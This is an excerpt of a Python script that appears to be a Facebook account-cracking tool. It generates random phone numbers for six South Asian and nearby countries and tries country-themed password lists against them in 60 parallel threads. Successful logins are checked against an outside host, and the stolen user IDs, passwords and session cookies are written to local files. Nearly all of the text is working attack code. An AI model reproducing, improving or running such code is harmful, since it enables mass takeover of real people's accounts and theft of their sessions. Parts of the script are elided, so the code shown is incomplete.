{xd} TOOLS     {R}:{G} RANDOM {W}6{G} COUNTRY CLONE
{xd} CONTACT {R}:{Y} 01864399793
...
def mrNOYSHIM():
    ...
    if ___option___ in ["1"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');NOYSHIM.append('1');______randomxmenu_______()
    elif ___option___ in ["2"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');NOYSHIM.append('2');______randomxmenu_______()
    elif ___option___ in ["3"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');NOYSHIM.append('3');______randomxmenu_______()
    elif ___option___ in ["4"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');NOYSHIM.append('4');______randomxmenu_______()
    elif ___option___ in ["5"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');NOYSHIM.append('5');______randomxmenu_______()
    elif ___option___ in ["6"]:os.system('xdg-open https://www.facebook.com/Noyshim.504');NOYSHIM.append('6');______randomxmenu_______()
    elif ___option___ in ["0"]:exit()
    else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);mrNOYSHIM()
#---------------------[ RANDOM BD/INDIA/PAKISTAN/NEPAL/AFGHANISTAN/MALAYSIA MENU ]---------------------#
def ______randomxmenu_______():
    clear()
    if "1" in NOYSHIM:print(f"{xd} EXAMPLE {R}:{G} 013 {R}|{G} 016 {R}|{G} 017 {R}|{G} 018 {R}|{G} 019 ");linex()
    if "2" in NOYSHIM:print(f"{xd} EXAMPLE {R}:{G} +91639 {R}|{G} +91600 {R}|{G} +91620 ");linex()
    if "3" in NOYSHIM:print(f"{xd} EXAMPLE {R}:{G} 0306 {R}|{G} 0315 {R}|{G} 0335 {R}|{G} 0345 ");linex()
    if "4" in NOYSHIM:print(f"{xd} EXAMPLE {R}:{G} 9814 {R}|{G} 9815 {R}|{G} 9861 {R}|{G} 9840 ");linex()
    if "5" in NOYSHIM:print(f"{xd} EXAMPLE {R}:{G} +9340 {R}|{G} +9360 {R}|{G} +9330 {R}|{G} +9350 ");linex()
    if "6" in NOYSHIM:print(f"{xd} EXAMPLE {R}:{G} 0113 {R}|{G} 0116 {R}|{G} 0112 {R}|{G} 0119 ");linex()
    ...
    for nmbr in range(int(limit)):
        if "1" in NOYSHIM:gang = ''.join(random.choice(string.digits) for _ in range(8));user.append(gang)
        if "2" in NOYSHIM:gang = ''.join(random.choice(string.digits) for _ in range(6));user.append(gang)
        if "3" in NOYSHIM:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
        if "4" in NOYSHIM:gang = ''.join(random.choice(string.digits) for _ in range(6));user.append(gang)
        if "5" in NOYSHIM:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
        if "6" in NOYSHIM:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
    with ThreadPool(max_workers=60) as ____NOYSHIM____:
        ...
        for love in user:
            ids = code + love 
            if "1" in NOYSHIM:pasx=[ids,love,ids[:6],ids[:7],ids[:8],ids[5:]]
            if "2" in NOYSHIM:pasx=[ids,love,ids[:6],"57273200","57575751","59039200"]
            if "3" in NOYSHIM:pasx=[ids,love,ids[5:],'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            if "4" in NOYSHIM:pasx=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            if "5" in NOYSHIM:pasx=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            if "6" in NOYSHIM:pasx=[ids,love,love[1:],ids[:7],ids[:6],ids[:8]]
            if ___method___ in ['1']:____NOYSHIM____.submit(____methodA____,ids,pasx,tl)
            elif ___method___ in ['2']:____NOYSHIM____.submit(____methodB____,ids,pasx,tl)
...
def ____methodA____(ids,pasx,tl):
    ...
    sys.stdout.write(f'\r\r{xd}-{R}[{G}MRNOYSHIM-M1{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}] ');sys.stdout.flush()
    for pw in pasx:
        try:
            ...
            if "checkpoint" in ewe.cookies.get_dict():
                ...
                print(f"\r{xd}-{R}[{Y}MRNOYSHIM-CP{R}]{Y} {uid} | {pw} ")
                open('/sdcard/MRNOYSHIM-M1-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                cp+=1
                break
                ...
                response = str(requests.get(f"https://mrNOYSHIM143.pythonanywhere.com/live?uid={uid}").text)
                if 'LIVE' in response:
                    print(f"\r{xd}-{R}[{G}MRNOYSHIM-OK{R}]{G} {uid} | {pw} ")
                    print(f"\r{R}[\U0001F4A5{R}]{G} {kuki} ");print(f"{W}{47*'-'}")
                    open('/sdcard/MRNOYSHIM-M1-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
                    ok+=1
                    break
                else:continue
...
def ____methodB____(ids,pasx,tl):
        global loop,ok,cp
        sys.stdout.write(f'\r\r{xd}-{R}[{G}MRNOYSHIM-M2{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}] ');sys.stdout.flush()
        try:
                for pw in pasx:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'LIVE' in response:
                                            print(f"\r{xd}-{R}[{G}MRNOYSHIM-OK{R}]{G} {uid} | {pw} ")
                                            print(f"\r {R}[\U0001F4A5{R}]{G} {kuki} ");print(f"{W}{47*'-'}")
                                            open('/sdcard/MRNOYSHIM-M2-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
                                            ok.append(str(uid))
                                            break
                                        else:continue
                                        ...
                                        print(f"\r{xd}-{R}[{Y}MRNOYSHIM-CP{R}]{Y} {uid} | {pw} ")
                                        open('/sdcard/MRNOYSHIM-M2-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                                        cp.append(str(uid))
                                        break
                        else:continue
                loop+=1
